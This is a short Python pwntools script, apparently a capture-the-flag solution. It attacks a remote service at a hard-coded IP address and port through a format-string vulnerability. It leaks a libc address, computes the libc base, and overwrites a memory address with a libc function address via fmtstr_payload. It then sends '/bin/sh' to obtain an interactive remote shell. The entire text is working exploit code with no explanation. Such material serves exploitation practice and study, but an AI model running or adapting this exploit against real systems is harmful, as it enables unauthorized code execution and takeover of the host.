from pwn import *

context.log_level = 'debug'
context.arch='x86'
# p = process('sp1')
p = remote("123.57.69.203","7010")

libc = ELF('libc-2.27.so')

#leak
payload = '%35$p'
p.recvuntil('Can you find the magic word?\n')

p.sendline(payload)

addr = int(p.recv(len("0xf7dd6ee5")),16)

offset = libc.sym['__libc_start_main']
libc_base = addr - 245 - offset

print "[-]libc_base=>" + hex(libc_base)

one = libc_base + 0x3d200
print hex(one)

payload = fmtstr_payload(6, {0x08049A60:one})

sleep(0.5)
p.sendline(payload)

sleep(0.5)

p.sendline('/bin/sh\x00')
p.interactive()